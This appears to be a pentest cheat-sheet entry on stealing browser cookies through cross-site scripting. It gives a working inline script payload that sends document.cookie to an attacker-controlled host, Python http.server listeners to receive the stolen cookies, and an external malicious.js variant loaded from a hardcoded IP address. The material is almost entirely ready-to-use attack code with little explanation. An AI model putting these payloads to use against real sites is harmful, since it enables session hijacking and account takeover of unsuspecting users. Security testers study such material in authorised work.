---
title: XSS - Cookie Stealing
category: initial-access
subcategory: web-attacks
os: linux
command: malicious.js
tools: python http.server
---


### Inline cookie exfiltration payload

```html
<script>var i=new Image;i.src="http://attacker:8080/?"+document.cookie;</script>
```

### Listener

```bash
python -m http.server 8080
```

### External JS variant

Save the payload to `malicious.js`:

```html
<script>var i=new Image;i.src="http://attacker:8081/?"+document.cookie;</script>
```

Two listeners (one for hosting, one to receive the leaked cookies):

```bash
python -m http.server 8080
python -m http.server 8081
```

Then deliver:

```html
<script src="http://192.168.119.202:8080/malicious.js"></script>
```

### Reference

https://html5sec.org/
